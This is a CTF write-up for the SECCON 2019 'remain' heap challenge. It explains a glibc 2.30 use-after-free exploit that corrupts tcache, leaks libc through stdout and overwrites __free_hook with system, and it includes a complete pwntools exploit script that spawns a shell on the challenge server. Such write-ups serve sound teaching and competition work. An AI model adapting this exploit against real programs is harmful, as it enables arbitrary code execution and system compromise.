---
title: remain - SECCON CTF Quals 2019
date: 2019-10-20 15:00:00
categories:
  - Pwn
  - linux
  - heap
tags:
  - CTF
  - writeup
  - Pwn
---

linux heap exploitation challenge with glibc 2.30
<!-- excerpt -->

**Challenge points**: 418
**No. of solves**: 19

A glibc heap Note challenge

```c
Remain
MENU
****************
1. Add
2. Edit
3. Delete
0. Exit
****************
> 
```

Add
- malloc(0x48), fixed size
- read input into chunk
- check if space available in table[10]
- if full are there, then free chunk, else add to table

Edit
- Edit a chunk with size as strlen(content in the given table idx)

Delete
- Free a table[idx]
- table[idx] not nulled out, leading to `Use after Free`


glibc 2.30 has double free check just like 2.29
The tcache structure's address is used as cookie in a freed chunk in tcache. When a chuunk is freed ino the tcache.
```c
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);

  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e->key = tcache;

  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```

With subsequent free, if the key value is equal to tcache structure's address, then all the chunks in the tcache linked list of the particular size is checked in a loop for double free.
```c
	tcache_entry *e = (tcache_entry *) chunk2mem (p);
	if (__glibc_unlikely (e->key == tcache))
	  {
	    tcache_entry *tmp;
	    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
	    for (tmp = tcache->entries[tc_idx];
		 tmp;
		 tmp = tmp->next)
	      if (tmp == e)
		malloc_printerr ("free(): double free detected in tcache 2");
	    /* If we get here, it was a coincidence.  We've wasted a
	       few cycles, but don't abort.  */
	  }
```
Since we have use after free in edit function, we can overwrite the key to bypass the check,... oops wait a minute, the edit function uses strlen to get the size of the edit which means bypass is not easy.

But we still can change the next pointer of a freed tcache chunk, giving an `arbitary write in the heap` by partialy overwriting freed chunk's next pointer.

#### Exploitation
Since there is no show function, we will have to overwrite the stdout file structure to leak libc addresses. This directed my ideas to getting a parial overwrite to a freed tcache chunk with a libc address as the next pointer.

The size is fixed to 0x48, filling the tcache with these chunk will only put them in fastbin. We have to change the size of the chunk and then free it to get libc address as fd.
Remember that pointers in the table are not nulled out, so we have to finish the exploit with 10 allocations.

After a lot of thinking, this is what I came up with,
- use the partial overwrite to get write to the tcache structure
- overwrite the count for the 0xa0 chunk to 0x7 in the tcache structure
- now, when we free a 0xa0 chunk it will be inserted into the unsorted bin
- To free a 0xa0 chunk we partially overwrite the fd of free chunk to point above the first chunk allocated so as to overwrite the size. 
- Set the size as 0x51 itself and free it once
- Change the size to 0xa1 and free it, I chose to overwrite with 0xa0, as the next chunk size fields will be already set and chunk will be inserted into the unsorted bin without any hazzles.
- As we have a free tcache chunk pointing to a libc address, partially overwrite the libc address to point to stdout.
- Overwrite the `stdout->flags` with `0xfbad1800` and partiallly overwrite the `write_base` to `\x00` to dump a region of memory with the next puts call.
- Now overwrite the fd of a free tcache chunk to get overwrite `__free_hook`

Following all these steps I had already consumed 9 allocations out of the possible 10. 
But I need two more allocations to write `system` to `__free_hook`
Looking at the add functions again, we can notice that an allocation is made, our input is read into it and then free is called if table is full. This satisfies our requiredments perfectly.
Use the 10th allocation, and then 11th one to overwrite `__free_hook`. `system` is called for us within add functionality and we get shell :)

**Note: ** There is a 4 bit bruteforce for tcache structure and another 4 bit bruteforce to get stdout. Luckily I got shell in remote server in the 4th or 5th try.

```python
from pwn import *

#s=process("./rem",env={'LD_PRELOAD' : './libc.so.6'})
s=remote("remain.chal.seccon.jp", 27384)
libc=ELF("./libc.so.6")

def add(data):
    s.sendlineafter("> ", str(1))
    s.sendlineafter("Input memo > ", str(data))

def edit(idx, data):
    s.sendlineafter("> ", str(2))
    s.sendlineafter("Input id > ", str(idx))
    s.sendafter("Input new memo > ", str(data))

def free(idx):
    s.sendlineafter("> ", str(3))
    s.sendlineafter("Input id > ", str(idx))


# allocate tcache struct and overwrite the count for 0xa0 chunk with 0x7 
# when we free 0xa0 chunk, it will be inserted into the unsorted bin
add("a"*0x20 + p64(0) + p64(0x51))
add("a"*0x20 + p64(0) + p64(0x21))
free(0)
free(1)
edit(1,p16(0x7000)) # partially overwrite to point to tcache structure (4-bit bruteforce)
add("a"*0x40)
add(p64(0) + p64(0x291) + p64(0x0000000000000000) + p64(0x0707070707070707))
log.success("tcache structure written")

free(0)
free(1)
edit(1,p8(0x90)) # partially overwrite to point above chunk 1
add("a"*0x40)
add("b"*0x8 + p64(0x51)) # size edit primitive established
add("f"*0x40) # chunk allocated to prevent coallesing
free(6)
free(0)
edit(5,"a"*0x8 + "\xa1") # set size as 0xa0 
free(0)
log.success("freed 0xa0 chunk")

edit(0,"\xa0\x16") # partially ovewrite freed chunk
add("a"*0x40)
add(p64(0xfbad1800) + p64(0x00)*3 + "\x00")
s.recv(0x20)
base = u64(s.recv(8))-0x3b5a60
log.info("libc = " + hex(base))
free_hook = base + libc.symbols['__free_hook']
malloc_hook = base + libc.symbols['__malloc_hook']
system = base + libc.symbols['system']

edit(5,"a"*0x8 + "\x51")
free(0) 
free(1)
edit(1,p64(free_hook-0x8)[:-2])
add("a"*0x40)
add("/bin/sh\x00" + p64(system))
s.sendline("cat flag.txt")

s.interactive()
```




